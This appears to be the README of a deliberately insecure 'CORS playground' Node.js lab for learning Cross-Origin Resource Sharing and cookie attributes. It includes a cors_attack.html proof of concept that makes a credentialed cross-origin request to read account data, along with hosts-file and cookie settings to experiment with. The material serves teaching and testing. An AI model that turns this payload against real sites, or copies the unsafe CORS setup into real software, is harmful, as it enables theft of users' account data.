## CORS Playground
### Description

CORS playground provides a simple web application that you can utilise to enhance your comprehension of Cross Origin Resource Sharing. By default, it comes with CORS configured in a very unsafe way and could be easily exploited from different origins.

To make the most out of the CORS playground application, you are highly encouraged to play with the CORS settings and the session's cookie attributes both within the application code as well as different origin values. This cannot be stressed enough, changing the settings mentioned, testing them with different browsers and seeing how both CORS and the session's cookie behave under different configurations will increase your knowledge of these two critical components of web application security.

### Default settings
CORS playground runs over https and listens on port number 5555

### URLs/endpoints
```http
POST /login.html
GET /main_page.html
GET /logout
GET /api/v2/accounts
GET /api/v1/accounts
```

### Example
The following is an example of running CORS playground on your local machine.

1. Add the following entries to the file /etc/hosts (remove the comments). You could use all these domains to test different values of the domain and SameSite cookie attribute.
```bash
127.0.0.1 playground.cors.test               ## Domain for the CORS playground application itself.
127.0.0.1 project.cors.test                  ## Same level domain as playground.cors.test.
127.0.0.1 pts.playground.cors.test           ## Subdomain of playground.cors.test
127.0.0.1 pts.playground.cors.test.com.au    ## domain .com.au
127.0.0.1 cors.test                          ## parent domain of playground.cors.test
127.0.0.1 another.domain.com                 ## A totally different domain
```
2. Run CORS playground with the command `nodejs app.js` then open it up on a browser as `https://playground.cors.test:5555/` and log in.
3. Run an Apache web server over TLS.
4. Paste the following HTML code into a file named cors_attack.html (this file is also provided in this repository) and saved it on your apache webroot which by default is: `/var/www/html/`

```html
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
   console.log(xhr.response);
  }
 }
 url = 'https://playground.cors.test:5555/api/accounts';
 xhr.open('GET',url,true);
 xhr.setRequestHeader('CORS-playground','Penetration Testing Team');
 xhr.withCredentials = true;
 xhr.send();
</script>
</body>
</html>
```
5. Open the following url `https://another.domain.com/cors_attack.html` on a browser and look that the account information is display on the browser console.
6. Use a http proxy such as Burp or the developer tools of the browser to observe the CORS requests/responses.
### Jump in
To keep improving your skills and knowledge of CORS you might like to:

1. Add/delete/modify the attributes of the cookie generated within this application. Look for the line:
```node
res.cookie('session',randomvalue.toString(), { httpOnly: true, secure: true, sameSite: 'None'});
```
 Some setting you could try:
```node
res.cookie('session',randomvalue.toString(), {domain: '.playground.cors.test', httpOnly: true, secure: true, sameSite: 'Lax'});
res.cookie('session',randomvalue.toString(), { httpOnly: true, secure: true, sameSite: 'Strict'});
```
2. In the corsHandler function within the code of this applicaiton, uncomment the the section you'd like to play with and comment the remaining ones.
### References:
1. [CORS tutuorial](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
2. [Same Origin Policy tutorial](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
3. [Cookies tutorial](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
4. [portswigger CORS labs](https://portswigger.net/web-security/cors)
